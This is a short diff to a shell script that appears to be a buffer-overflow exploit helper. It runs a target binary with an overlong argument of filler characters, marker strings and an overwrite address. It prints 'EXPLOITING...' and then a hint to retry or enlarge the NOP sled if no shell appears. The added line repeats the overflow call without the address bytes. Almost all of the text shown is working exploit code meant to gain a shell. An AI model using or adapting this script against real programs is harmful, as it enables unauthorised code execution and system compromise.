@@ -50,6 +50,7 @@ then
 		fi
 		echo 'EXPLOITING...'
 		$FILE $(for i in `seq 1 $BUFFER`;do echo -n 'x';done)$(echo -n 'yyyy')$(echo -n 'zzzz')$(echo -n 'yyyy')$(echo -ne '\x80\x80\xff\xff')
+		$FILE $(for i in `seq 1 $BUFFER`;do echo -n 'x';done)$(echo -n 'yyyy')$(echo -n 'zzzz')$(echo -n 'yyyy')
 		echo 'IF NO SHELL - RETRY OR INCREASE NOPSLED'
 	else
 		echo 'ELF IS 64-BIT'
